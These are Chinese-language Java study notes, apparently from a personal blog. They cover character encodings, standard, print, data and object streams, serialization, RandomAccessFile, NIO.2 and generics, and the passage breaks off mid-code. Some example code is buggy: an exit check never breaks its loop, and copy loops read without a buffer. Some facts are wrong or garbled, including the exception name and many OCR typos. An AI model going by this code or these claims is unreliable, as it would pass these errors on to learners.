字符集\n\n**编码表的由来**\n\n```bash\n计算机只能识别二进制数据，早期由来是电信号。为了方便应用计算机，让它可以识别各个国家的文字。就将各个国家的文字用数字来表示，并一―对应，形成一张表。这就是编码表。\n```\n\n\n\n**常见的编码表**\n\n- **ASCII**: 美国标准信息交换码。\n  用一个字节的7位可以表示。\n- **ISO8859-1**: 拉丁码表/欧洲码表\n  用一个字节的8位表示。\n- **GB2312**: 中国的中文编码表。最多两个字节编码所有字符\n- **GBK**: 中国的中文编码表升级，融合了更多的中文文字符号。最多两个字节编码\n- **Unicode**: 国际标准码，融合了目前人类使用的所有字符。为每个字符分配唯一的字符码。所有的文字都用两个字节来表示。\n- **UTF-8**:变长的编码方式，可用1-4个字节来表示一个字符。\n\n\n\n- Unicode不完美，这里就有三个问题，一个是，我们已经知道，英文字母只用一个字节表示就够了，第二个问题是如何才能区别Unicode利和IIASCIl?计算机怎么知道两个字节表示一个符号，而不是分别表示两个符号呢?第三个，如果和IGBK等双字节编码方式一样，用最高位是1或O表示两个字节和一个字节，就少了很多值无法用于表示字符，不够表示所有字符。Unicode在很长一段时间内无法推广，直到互联网的出现。\n- 面向传输的众多UTF (UCS Transfer Format〉标准出现了，顾名思义，**UTF-8就是每次8个位传输数据，而UTF-16就是每次16个位**。这是为传输而设计的编码，并使编码无国界，这样就可以显示全世界上所有文化的字符了。\n- **Unicode只是定义了一个庞大的、全球通用的字符集，并为每个字符规定了唯一确定的编号，具体存储成什么样的字节流，取决于字符编码方案**。推荐的Unicode编码是UTF-8和UTF-16。\n\n- ANSI编码, 通常指的是平台的默认编码,例如英文操作系统中是ISO-8859-1，中文系统是GBK\n- **Unicode字符集**只是定义了字符的集合和唯一编号，**Unicode编码**，则是对UTF-8、UCS-2/UTF-16等具体编码方案的**统称**而已，并不是具体的编码方案。\n\n\n\n\n\n\n\n### 标准输入、输出流(了解即可)\n\n- System.in和System.out分别代表了系统标准的输入和输出设备\n\n- 默认输入设备是:键盘，输出设备是:显示器\n\n- System.in的类型是InputStream\n\n- System.out的类型是PrintStream，其是OutputStream的子类FilterOutputStream 的子类\n\n- 重定向:通过System类的setIn，setOut方法对默认设备进行改变。\n\n  ```java\n  public static void setln(InputStream in)\n  public static void setOut(PrintStream out)\n  ```\n\n  \n\n```java\n    /*\n    标准输入、输出流\n    1.\n    System.in:标准的输入流，默认从键盘输出\n    System.out:标准的输出流，默认从控制台输出\n\n    2.\n    System类的setIn(InputStream is) / setOut(PrintStream ps)方式重新指定输入和输出的流\n\n     */\n    @Test\n    public void test(){\n        // 练习：从键盘输入字符串，要求将读取到的整行字符串转成大写输出。然后继续进行输入操作，直至当输入“e”或者“exit”时，退出程序。\n//       方法1： 可以用Scanner来做, 调用next()返回一个字符串\n//       方法2：System.in --> 转换流 --> BufferedReader的readLine()\n\n        BufferedReader br = null;\n        try{\n            InputStreamReader isr = new InputStreamReader(System.in);\n             br = new BufferedReader(isr);\n\n            while (true){\n                System.out.println(\"请输入字符串：\");\n                String data = br.readLine();\n                if(\"e\".equalsIgnoreCase(data) || \"exit\".equalsIgnoreCase(data)){\n                    System.out.println(\"程序结束\");\n                }\n\n                String upperCase = data.toUpperCase();\n                System.out.println(upperCase);\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }finally {\n            if(br != null){\n                try{\n                    br.close();\n                }catch (Exception e){\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n```\n\n\n\n\n\n### 打印流(了解即可)\n\n- 实现将**基本数据类型**的数据格式转化为**字符串**输出\n- 打印流:**PrintStream**和**PrintWriter**\n  - 提供了一系列重载的print()和printIln()方法，用于多种数据类型的输\n  - PrintStream和PrintWriter的输出不会抛出IOException异常\n  - PrintStream和PrintWriter有自动flush功能\n  - PrintStream打印的所有字符都使用平台的默认字符编码转换为字节。在需要写入字符而不是写入字节的情况下，应该使用 PrintWriter类。\n  - System.out返回的是PrintStream的实例\n\n```\n提供了一些列重载的print()和println()\n```\n\n\n\n### 数据流(了解即可)\n\n> ​    作用: 用于读取或写出基本数据类型的变量或字符串\n\n- 为了方便地操作Java语言的基本数据类型和String的数据，可以使用数据流。\n- 数据流有两个类:(用于读取和写出基本数据类型、String类的数据)\n  - **DatalnputStream**和 **DataOutputStream**\n  - 分别“套接”在InputStream和 OutputStream子类的流上\n- DatalnputStream中的方法\n  boolean readBoolean()\n  byte readByte()\n  char readChar(\n  float readFloat()\n  double readDouble()\n  short readShort()\n  long readLong()\n  int readInt()\n  String readUTF(\n  void readFully(byte[ b)\n- DataOutputStream中的方法\n  - 将上述的方法的read改为相应的write即可。\n\n\n\n```java\n    /*\n    数据流\n    1.\n    DataInputStream\n    DataOutputStream\n\n    2.\n    作用:用于读取或写出基本数据类型的变量或字符串, 基本数据类型持久换\n    \n    3.Note:\n    读取不同类型的数据要与当初写入文件时，保存的数据的顺序一致\n\n     */\n    @Test\n    public void test2() throws IOException {\n        // 练习：将内存中的字符串、基本数据类型的变量写出到文件中。|\n        DataOutputStream dos = new DataOutputStream(new FileOutputStream(\"1.txt\"));\n        dos.writeUTF(\"小小\");\n        dos.flush();  //刷新操作，将内存中数据写入\n        dos.writeInt(18);\n        dos.flush();\n        dos.close(); //这个文件也要用数据流读\n\n        //将文件中存储的基本数据类型和字符串读取到内存中，保存在变量中\n        DataInputStream dos2 = new DataInputStream(new FileInputStream(\"1.txt\"));\n        String name = dos2.readUTF();\n        int age = dos2.readInt();\n        dos2.close(); \n        \n    }\n\n\n```\n\n\n\n\n\n### 对象流(重点)\n\n> ​    作用: 用于读取或写出对象,  对象持久换\n\n\n\n- **ObjectInputStream**和**ObjectOutputSteam**\n- 用于存储和读取**基本数据类型**数据或**对象**的处理流。它的强大之处就是可以把Java中的对象写入到数据源中，也能把对象从数据源中还原回来。\n- **序列化:** 用ObjectOutputStream类保存基木类型数据或对象的机制\n- **反序列化**: 用ObjectInputStream类读取基木类型数据或对象的机\n- ObjectOutputStream和IObjectlnputStream不**能序列化static利transient修饰的**成员变量\n\n\n\n\n\n#### 对象的序列化\n\n- **对象序列化机制**允许**把内存中的Java对象转换成平台无关的二进制流**，从而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到另一个网络节点。当其它程序获取了这种二进制流，就可以恢复成原来的Java对象\n- 序列化的好处在于可将任何实现了Serializable接口的对象转化为**字节数据**，使其在保存和传输时可被还原\n- 序列化是 **RMI(**Remote Method Invoke -远程方法调用)过程的参数和返回值都必须实现的机制，而 RMI是JavaEE的基础。因此序列化机制是JavaEE平台的基础\n- 如果需要让某个对象支持序列化机制，则必须让对象所属的类及其属性是可序列化的，为了让某个类是可序列化的，该类必须实现如下两个接口之一。否则，会抛出NotSerializableException异常\n  - Serializable\n  - Externalizable\n\n\n\n\n\n**要想序列化自定义类，需要满足哪些要求？**\n\n自定义需要满足如下要求，方可序列化\n\n1. 需要实现接口：Serializable\n\n2. 当前类提供一个全局常量：serialVersionUID\n\n`static final long serialVersionUID = 446768135468782L;`\n\n3. 除了当前自定义类需要实现Serializable接口之外，还必须保证其内部所有属性也是可序列化的(但是默认情况下，基本数据类型是可序列化的)，内部如果有其他自定义类，就需要让其他类也实现Serializable接口\n   \n   \n\n\n\n代码：\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.io.*;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-30 14:47\n * @功能：对象流\n * 1.\n * ObjectInputStream\n * ObjectOutputSteam\n *\n *2.要想序列化自定义类，需要满足哪些要求？\n *  * Person需要满足如下要求，方可序列化\n *  * 1.需要实现接口：Serializable\n *  * 2.当前类提供一个全局常量：serialVersionUID\n *  * static final long serialVersionUID = 446768135468782L;\n *  3.除了当前Person类需要实现Serializable接口之外，还必须保证其内部所有属性也是可序列化的\n *   (但是默认情况下，基本数据类型是可序列化的)内部如果有其他自定义类，就需要让其他类也实现Serializable接口\n *\n *\n * 4.序列化机制：\n * 对象序列化机制允许把内存中的Java对象转换成平台无关的二进制流，从\n * 而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到\n * 另一个网络节点。当其它程序获取了这种二进制流，就可以恢复成原来的Java对象\n *\n *\n *\n */\npublic class ObjectStream {\n    /*\n    序列化过程：将内存中的Java对象保存到磁盘中或通过网络传输出去\n    使用ObjectOutputStream实现\n     */\n    @Test\n    public void test(){\n        ObjectOutputStream oos = null;\n        try {\n            //1.\n            oos = new ObjectOutputStream(new FileOutputStream(\"d:\\\\io\\\\233.txt\")); //这个文件不是让你打开的，想看就用反序列化\n            //2.\n            oos.writeObject(new String(\"我爱天安门\"));\n            oos.flush();\n\n            //也可以序列化自定义类\n            //\n            oos.writeObject(new Person(\"Tom\", 18));\n            oos.flush();\n\n            oos.writeObject(new Person(\"Tom2\", 18, new Account(1000)));\n            oos.flush();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            if(oos != null){\n                try {\n                    //3.\n                    oos.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    /*\n    反序列化：将磁盘文件中的对象或网络中的序列化的东西，还原为内存中的Java对象\n    使用 ObjectInputStream\n     */\n    @Test\n    public void test1(){\n        ObjectInputStream ois = null;\n        try {\n            //1.\n            ois = new ObjectInputStream(new FileInputStream(\"d:\\\\io\\\\233.txt\")); // 通过反序列化来查看前面保存的文件内容\n            //2.\n            Object obj = ois.readObject();\n            String str = (String)obj;\n\n            //看一下自定义类反序列化后\n            Person p = (Person)ois.readObject();\n            System.out.println(p.toString());\n\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            if(ois != null){\n                try {\n                    //3.\n                    ois.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n\n    }\n\n\n\n    @Test\n    public void test2(){\n\n    }\n\n\n    @Test\n    public void test3(){\n\n    }\n}\n\n```\n\n```java\npackage cn.xpshuai.java1;\n\nimport java.io.Serializable;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-30 17:25\n * @功能： 自定义的可被序列化的类\n *\n * Person需要满足如下要求，方可序列化\n * 1.需要实现接口：Serializable\n * 2.当前类提供一个全局常量：serialVersionUID\n * static final long serialVersionUID = 446768135468782L;\n *\n * 3.除了当前Person类需要实现Serializable接口之外，还必须保证其内部所有属性也是可序列化的\n *   (但是默认情况下，基本数据类型是可序列化的)内部如果有其他自定义类，就需要让其他类也实现Serializable接口\n *\n * 补充：\n * ObjectOutputStream和IObjectlnputStream不**能序列化static利transient修饰的**成员变量\n *\n *\n */\npublic class Person implements Serializable {\n    static final long serialVersionUID = 446768135468782L;\n\n    private String name;\n    private int age;\n    private Account acc;\n\n    public Person() {\n    }\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public Person(String name, int age, Account acc) {\n        this.name = name;\n        this.age = age;\n        this.acc = acc;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n   }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                \", acc=\" + acc +\n                '}';\n    }\n}\n\n\nclass Account implements Serializable{\n    static final long serialVersionUID = 44676813666782L;\n\n    private double balance;\n\n    public Account() {\n    }\n\n    public Account(double balance) {\n        this.balance = balance;\n    }\n\n    public double getBalance() {\n        return balance;\n    }\n\n    public void setBalance(double balance) {\n        this.balance = balance;\n    }\n\n    @Override\n    public String toString() {\n        return \"Account{\" +\n                \"balance=\" + balance +\n                '}';\n    }\n}\n\n```\n\n\n\n**serialVersionUID的理解：**\n\n- 凡是实现Serializable接口的类都有一个表示序列化版本标识符的静态变量:private \n  - **static final long serialVersionUID**;\n  - `serialVersionuID`用来表明类的不同版本间的兼容性。简言之，其目的是以序列化对里进行版本控制，有关各版本反序列化时是否兼容。\n  - 如果类没有显示定义这个静态常量，它的值是Java运行时环境根据类的内部细节自动生成的。若类的实例变量做了修改，seriaVersionUID可能发生变化。故**建议，显式声明**。\n- 简单来说，Java的序列化机制是通过在运行时判断类的serialVersionUID来验证版木一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与木地相应实体类的serialVersionUID进行比较，**如果相同就认为是一致的，可以进行反序列化**，否则就会出现序列化版本不一致的异常(InvalidCastException)。\n\n\n\n\n\n\n\n\n\n\n\n### 随机存取文件流(了解即可)\n\n**RandomAccessFile类**\n\n- `RandomAccessFile`声明在`java.io`包下，但直接继承于`java.lang.Object`类。并且它实现了Datalnput、DataOutput这两个接口，也就意味着这个类既**可以读也可以写**。\n- RandomAccessFile类支持“随机访问”的方式，程序**可以直接跳到文件的任意地方**来读、写文件\n  - 支持只访问文件的部分内容\n  - 可以向**已存在**的文件后**追加**内容\n- RandomAccessFile对象包含一个记录指针，用以标示当前读写处的位置。RandomAccessFile 类对象可以自由移动记录指针:\n  - `long getFilePointer()`:获取文件记录指针的当前位置\n  - `void seek(long pos)`:将文件记录指针定位到pos位置\n\n\n\n**构造器**\n\n```bash\npublic RandomAccessFile(File file, String mode)\n\npublic RandomAccessFile(String name, string made)\n```\n\n\n\n创建RandomAccessFile类实例需要指定一个**mode参数**，该参数指定RandomAccessFile的访问模式:\n\n```bash\nr:以只读方式打开\nrw:打开以便读取和写入\nrwd:打开以便读取和写入:同步文件内容的更新\nrws:打开以便读取和写入;同步文件内容和元薮据的更新\n```\n\n- 如果模式为只读`r`。则不会创建文件，而是会去读取一个已经存在的文件,如果读取的文件不存在则会出现异常。\n\n- 如果模式为`rw读写`。如果文件不存在则会去创建文件，如果存在则不会创建。\n\n\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-30 17:46\n * @功能：随机存取文件流\n *\n * 1.直接继承java.lang.Object类\n *   实现了DataInput和DataOutput接口\n *      RandomAccessFile，既可以输入也可以输出(但是复制的时候还是需要造两个对象哦)\n *\n *\n *2.如果RandomAccessFile作为输出李璐，写出到的文件如果不存在，则在执行过程中自动创建\n *  如果写出的文件存在，则会对原有文件从头覆盖\n *\n *\n * 3.通过相关操作，实现RandomAccessFile对文件内容实现插入式的效果\n *\n */\npublic class RandomStream {\n    @Test\n    public void test() throws IOException {\n//        1.造输入流、输出流\n        RandomAccessFile raf1 = new RandomAccessFile(new File(\"d:\\\\io\\\\1.txt\"), \"r\");\n        RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\1111111.txt\"), \"rw\");\n\n//        2.读写过程\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = raf1.read()) != -1){\n            raf2.write(buffer, 0, len);\n        }\n\n//        3.关闭\n        raf1.close();\n        raf2.close();\n\n    }\n\n\n    /*\n    测试 对文本内容的覆盖\n\n     */\n    @Test\n    public void test2() throws IOException {\n        RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\hello1.txt\"), \"rw\");\n        raf2.write(\"xxx\".getBytes());\n        raf2.close();\n\n    }\n\n\n    /*\n实现数据的插入：seek(long pos) -->将文件记录定位到指针位置\n\n */\n    @Test\n    public void test3() throws IOException {\n        RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\hello1.txt\"), \"rw\");\n        raf2.seek(3); //指针调到角标为3的位置(第四个字符)\n        raf2.write(\"xxx\".getBytes()); // write 直接覆盖了第四个位置原有字符\n\n        //实现指定位置的插入数据的追加效果(不覆盖原有位置的字符)\n\n\n\n        raf2.close();\n\n    }\n\n    /*\n实现数据的插入：seek(long pos) -->将文件记录定位到指针位置\n实现指定位置的插入数据的追加效果(不覆盖原有位置的字符)\n*/\n    @Test\n    public void test4() throws IOException {\n        RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\hello1.txt\"), \"rw\");\n        raf2.seek(3); //指针调到角标为3的位置(第四个字符)\n        //保存指针3后面的数据\n        StringBuilder builder = new StringBuilder((int)new File(\"d:\\\\io\\1.txt\").length());\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = raf2.read()) != -1){\n            builder.append(new String(buffer,0,len));\n        }\n        //调回指针\n        raf2.seek(3);\n        raf2.write(\"XXX\".getBytes());\n        //将StringBuilder中的数据写回去\n        raf2.write(builder.toString().getBytes());\n\n        raf2.close();\n\n    }\n}\n\n```\n\n\n\n\n\n\n\n### NIO.2中Path、Paths、Files类的使用(了解即可)\n\n#### Java NIO\n\nJava NIO (New lO，Non-Blocking lO)是从Java 1.4版木开始引入的一套新的IOAPI，可以替代标准的Java lO API。NIO与原来的IO有同样的作用和目的，但是使用的方式完全不同，**NIO支持面向缓冲区的**(IO是面向流的)、基于通道的IO操作。**NIO将以更加高效的方式进行文件的读写操作**。\n\nJava API中提供了两套NIO，一套是针对标准输入输出NIO，另一套就是网络编程NIO.\n\n```bash\n|-----java.nio.channels.Channel\n\t|-----FileChannel:处理本地文件\n\t|-----SocketChannel:TCP网络编程的客户端的Channel\n\t|-----ServerSocketChannel:TCP网络编程的服务器端的Channel\t\t\n    |-----DatagramChannel:UDP网络编程中发送端和接收端的Channel\n```\n\n\n\n\n\n\n\n#### NIO.2\n\n随着JDK7的发布，Java对NIO进行了极大的扩展，增强了对文件处理和文件系统特性的支持，以至于我们称他们为NIO.2。因为NIO提供的一些功能，NIO已经成为文件处理中越来越重要的部分。\n\n\n\n\n\n**Path、Paths和Files核心API:**\n\n- **早期**的Java只提供了一个**File类**来访问文件系统，但File类的功能比较有限，提供的方法性能也不高。而且，**大多数方法在出错时仅返回失败，并不会提供异常信息**。\n\n- **NIO.2**为了弥补这种不足，引入了Path接口，代表一个平台无关的平台路径,描述了目录结构中文件的位置。**Path可以看成是File类的升级版木，实际引用的资源也可以不存在**。\n\n- 在以前IO操作都是这样写的:\n\n  ```java\n  import java.io.File;\n  File file = new File(\"index.html\");\n  ```\n\n  \n\n- 但在Java7中，我们可以这样写:\n\n  ```java\n  import java.nio.file.Path;\n  import java.nio.file.Paths;\n  Path path = Paths.get(\"\"index.html\");\n  ```\n\n- 同时，NIO.2在java.nio.file包下还提供了Files、Paths工具类，Files包含了大量静态的工具方法来操作文件: Paths则包含了两个返回Path的静态工厂方法。\n\n- Paths类提供的静态 get()方法用来获取Path对象:\n\n  ```java\n  static Path get(String first, string ... more):     //用于将多个字符串串连成路径\n  static Path get(URl uri):      //返回指定uri对应的Path路径\n  ```\n\n  \n\n\n\n**Files类：**\n\n![JavaFiles类1](http://image.xpshuai.cn/JavaFiles%E7%B1%BB1.png)\n\n![JavaFiles类2](http://image.xpshuai.cn/JavaFiles%E7%B1%BB2.png)\n\n\n\n\n\n\n\n**题外话:**\n\n **IDEA导入jar包：**复制到目录下，右击--> add as Library  ， 然后就可以用了(里面放的class文件，可以对它进行反编译)\n\n\n\n\n\n","tags":["文件"],"categories":["Java学习"]},{"title":"Java学习之泛型","url":"%2Fposts%2F33005%2F","content":"\n### 为什么要有泛型\n\n> 泛型：标签\n\n集合容器类在设计阶段/声明阶段不能确定这个容器到底实际存的是什么类型的对象，所以在**JDK1.5之前只能把元素类型设计为Object，JDK1.5之后使用泛型来解决**。因为这个时候除了元素的类型不确定，其他的部分是确定的，例如关于这个元素如何保存，如何管理等是确定的，因此此**时把元素的类型设计成一个参数，这个类型参数叫做泛型**。`Collection<E>`，`List<E>`，`ArrayList<E>`这个<E>就是类型参数，即泛型。\n\n```\n* 举例：\n* 中药店，每个出题外面贴着标签\n* 超市购物加上很多瓶子，每个瓶子装的是什么，有标签\n```\n\n\n\n#### 泛型的概念\n\n- <font color=red>所谓泛型，就是允许在定义类、接口时通过一个标识表示类中某个属性的类型或者是某个方法的返回值及参数类型。这个类型参数将在使用时（例如，继承或实现这个接口，用这个类型声明变量、创建对象时）确定（即传入实际的类型参数，也称为类型实参)。</font>\n- **从JDK1.5以后，Java引入**了“参数化类型(Parameterized type)”的概念，允许我们在创建集合时再指定集合元素的类型，正如: `List<String>`，这表明该List只能保存字符串类型的对象\n- JDK1.5改写了集合框架中的全部接口和类，为这些接口、类增加了泛型支持，从而可以在声明集合变量、创建集合对象时传入类型实参。\n\n\n\n**使用与不使用泛型的区别：**\n\n![为何使用泛型](http://image.xpshuai.cn/%E4%B8%BA%E4%BD%95%E4%BD%BF%E7%94%A8%E6%B3%9B%E5%9E%8B.png)\n\n\n\n\n\n\n\n### 在集合中使用泛型\n\n```java\n /** 泛型的使用：\n *1.从JDK1.5以后新增的特性\n *\n *2.在集合中使用泛型：\n *      (1).集合接口或集合类在jdk5.0时都修改为带泛型的结构\n *      (2).在实例化集合类时，可以指明具体的泛型类型\n *      (3).指明完以后，在集合类或接口中凡是定义类或接口时，内部结构(比如方法、构造器、属性等)使用到类的泛型的位置，都指定为实例化的泛型类型\n *          比如：add(E e) --> 实例化时候: add(Integer e)\n *      (4).泛型的类型必须是类，不能是基本数据类型。需要用到基本数据类型的位置，拿包装类替换\n *      (5).如果实例化时，没有指定泛型的类型，默认类型为java.lang.Object类型\n *\n **/\n\n\n    /*\n    * 在集合中不使用泛型的情况\n    * */\n    @Test\n    public void test(){\n        ArrayList list = new ArrayList();\n        // 存放学生成绩\n        list.add(78);\n        list.add(99);\n        list.add(88);\n        list.add(65);\n        //问题1：类型不安全\n        list.add(\"Tom\");\n\n        for(Object score: list){\n            //问题2：强转时，可能出现ClassCastException\n            int stuScore = (Integer) score;\n            System.out.println(stuScore);\n        }\n\n    }\n\n    /*\n     * 在集合中使用泛型的情况: 以ArrayList为例\n     * */\n    @Test\n    public void test1(){\n        ArrayList<Integer> list = new ArrayList<Integer>();  // 用Integer而不是int，泛型是类型，不能用基本类型所以用包装类\n        //这样传入的对象只能是Integer类型的了\n        list.add(78);\n        list.add(99);\n        list.add(88);\n        list.add(65);\n        // 编译时，就会进行类型检查，保证数据的安全\n//        list.add(\"Tom\");\n\n        //方式1：\n        for(Integer score: list){\n            // 避免了强转操作\n            int stuScore = score;\n            System.out.println(stuScore);\n        }\n        //方式2：\n        Iterator<Integer> iterator = list.iterator();\n        while (iterator.hasNext()){\n            int nu = iterator.next();\n            System.out.println(nu);\n        }\n\n    }\n\n    /*\n     * 在集合中使用泛型的情况: 以HashMap为例\n     * */\n    @Test\n    public void test2(){\n        Map<String, Integer> map = new HashMap<String, Integer>();\n        // key-value两个类型都要指定\n        map.put(\"TOm\", 18);\n        map.put(\"Tom\", 20);\n        map.put(\"Jerry\", 18);\n        \n        \n        //取\n        //泛型的嵌套\n        // Entry是Map里面的，没有暴露在外面\n        Set<Map.Entry<String, Integer>> entries = map.entrySet();\n        Iterator<Map.Entry<String, Integer>> iterator = entries.iterator();\n        while (iterator.hasNext()){\n            Map.Entry<String, Integer> entry = iterator.next();\n            String key = entry.getKey();\n            Integer val = entry.getValue();\n        }\n\n\n\n\n        // jdk7新特性：类型推断\n        Map<String, Integer> map2 = new HashMap<>();  //后面可省略\n\n\n\n    }\n\n```\n\n\n\n\n\n### 自定义泛型\n\n\n\n自定义的泛型类：\n\n```java\npackage cn.xpshuai.java1;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 14:28\n * @功能：自定义泛型结构：泛型类、泛型接口、泛型方法\n *\n * T,  E\n * k,v 一般为键值\n */\npublic class Order<T> {\n    String orderName;\n    int orderId;\n\n\n    //类的内部结构就可以使用类的泛型\n    T orderT;\n\n    public Order(){\n//        T[] arr = new T[10]; //编译不通过， 不能new\n//        T[] arr = (T[]) new Object[10]; //这样可以，但是一般不这么用\n\n\n    }\n\n    public Order(String orderName, int orderId, T orderT) {\n        this.orderName = orderName;\n        this.orderId = orderId;\n        this.orderT = orderT;\n\n    }\n\n    //如下上方法都不是泛型方法\n    public T getOrderT(){\n        return orderT;\n    }\n\n    public void setOrderT(T orderT){\n        this.orderT = orderT;\n    }\n\n    @Override\n    public String toString() {\n        return \"Order{\" +\n                \"orderName='\" + orderName + '\\'' +\n                \", orderId='\" + orderId + '\\'' +\n                \", orderT=\" + orderT +\n                '}';\n    }\n\n    //静态方法中不能使用类的泛型\n//    public static void show(T orderT){\n//        System.out.println(\"show\");\n//    }\n\n//    public static void show2(){\n    // 编译不通过\n//       try{\n//\n//       }catch (T t){\n//\n//       }\n//    }\n\n\n    //泛型方法：在方法中出现了泛型的结构，泛型参数与类的泛型参数没有任何关系\n    //换句话说：泛型方达所属的类是不是泛型类都没有关系。\n    public <E> List<E> copyFromArrayToList(E[] arr){  // E类型的数组, 前面也要加<E>\n        ArrayList<E> list = new ArrayList<>();\n        for(E e: arr){\n            list.add(e);\n        }\n        return list;\n\n    }\n\n}\n\n```\n\n使用: \n\n```java\n    @Test\n    public void test3(){\n        // 使用自定义的泛型类 Order.java\n        // 如果定义了泛型类，实例化没有指明类的泛型，则认为此泛型类型为Object类型\n        // 要求：如果定义了类是带泛型的，建议在实例化时要指明类的泛型。\n//        Order order = new Order();\n//        order.setOrderT(12);\n//        order.setOrderT(\"AA\");\n\n        Order<String> order = new Order<String>(\"orderAA\", 1001, \"我是泛型小实例1\");\n        order.setOrderT(\"我是泛型小实例:2\");\n        System.out.println(order.getOrderT());\n\n\t\n        //【泛型在继承上的体现】\n        //如果子类指明了具体的泛型类型，使用子类实例化的时候就不用写泛型的形式了\n        SubOrder sub = new SubOrder();\n        //由于子类在继承带泛型的父类时，指明了泛型类型。则实例化子类对象时，不再需要指明泛型。\n        sub.setOrderT(111);\n\n\n        // 子类不具体父类中指明泛型的类型，SubOrder1<T>仍然是泛型类，使用子类实例化的时候仍然写泛型的形式了\n        SubOrder1<String> sub1 = new SubOrder1<>();\n        sub1.setOrderT(\"CCC\");\n\n\n\n    }\n\n```\n\n泛型类的子类：\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 14:40\n * @功能：Order的子类\n */\n\n//这里如果指明了具体的泛型类型，使用子类实例化的时候就不用写泛型的形式了\npublic class SubOrder extends Order<Integer>{\n    //......\n}\n\n```\n\n泛型类的子类2:\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 14:46\n * @功能：这里的子类不具体父类中指明泛型的类型，SubOrder1<T>仍然是泛型类，使用子类实例化的时候仍然写泛型的形式了\n */\npublic class SubOrder1<T> extends Order<T> {\n}\n\n```\n\n\n\n\n\n**自定义泛型类与泛型接口的注意点：**\n\n1. 泛型类可能有多个参数，此时应将多个参数一起放在尖括号内。比如:<E1,E2,E3>\n\n2. 泛型类声明的构造器如下:`public GenericClass()`。而下面是错误的:`public GenericClass<E>()`\n\n3. 实例化后，操作原来泛型位置的结构必须与指定的泛型类型一致。\n\n4. 泛型不同的引用不能相互赋值（尽管在编译时`ArrayList<String>和ArrayList<Integer>`是两种类型，但是，在运行时只有一个ArrayList被加载到JVM中）。\n\n5. 泛型如果不指定，将被擦除，泛型对应的类型均按照Object处理，但不等价于Object。经验: 泛型要使用一路都用。要不用，一路都不要用。\n\n6. 如果泛型结构是一个接口或抽象类，则不可创建泛型类的对象。\n\n7. jdk1.7，泛型的简化操作:`ArrayList<Fruit> flist = new ArrayList<>()`;\n\n8. 泛型的指定中不能使用基本数据类型，可以使用包装类替换。\n\n9. 在类/接口上声明的泛型，在本类或本接口中即代表某种类型，可以作为非静态属性的类型、非静态方法的参数类型、非静态方法的返回值类型。但在<font color=red>静态方法中不能使用类的泛型</font>。\n\n10. 异常类是不能声明为泛型的(`public calss MyExpection<T> extends Exception`是错误的)\n\n11. 不能使用new E[]。但是可以:`E]elements =(E[])new Object[capacity];`\n    参考: ArrayList源码中声明:Object[]elementData，而非泛型参数类型数组。\n\n12. 父类有泛型，子类可以选择保留泛型也可以选择指定泛型类型:\n\n    - 子类不保留父类的泛型: 按需实现\n      - 没有类型：擦除\n      - 具体类型\n    - 子类保留父类的泛型:泛型子类\n      - 全部保留\n      - 部分保留\n\n    **结论:**子类必须是“富二代”，子类除了指定或保留父类的泛型，还可以增加自己的泛型\n\n```java\n    @Test\n    public void test4(){\n//        泛型不同的引用不能相互赋值\n    ArrayList<String> l1 = null;\n    ArrayList<Integer> l2 = null;\n//    l2 = l1; //不能相互赋值\n\n    }\n\n\n\n```\n\n![子父类泛型](http://image.xpshuai.cn/%E5%AD%90%E7%88%B6%E7%B1%BB%E6%B3%9B%E5%9E%8B.png)\n\n\n\n**泛型方法(重难点)：**\n\n```java\npackage cn.xpshuai.java1;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 14:28\n * @功能：自定义泛型结构：泛型类、泛型接口、泛型方法\n *\n * T,  E\n * k,v 一般为键值\n */\npublic class Order<T> {\n    String orderName;\n    int orderId;\n\n\n    //类的内部结构就可以使用类的泛型\n    T orderT;\n\n    public Order(){\n//        T[] arr = new T[10]; //编译不通过， 不能new\n//        T[] arr = (T[]) new Object[10]; //这样可以，但是一般不这么用\n\n\n    }\n\n    public Order(String orderName, int orderId, T orderT) {\n        this.orderName = orderName;\n        this.orderId = orderId;\n        this.orderT = orderT;\n\n    }\n\n    //如下上方法都不是泛型方法\n    public T getOrderT(){\n        return orderT;\n    }\n\n    public void setOrderT(T orderT){\n        this.orderT = orderT;\n    }\n\n    @Override\n    public String toString() {\n        return \"Order{\" +\n                \"orderName='\" + orderName + '\\'' +\n                \", orderId='\" + orderId + '\\'' +\n                \", orderT=\" + orderT +\n                '}';\n    }\n\n    //静态方法中不能使用类的泛型(当时还没有这个对象)\n//    public static void show(T orderT){\n//        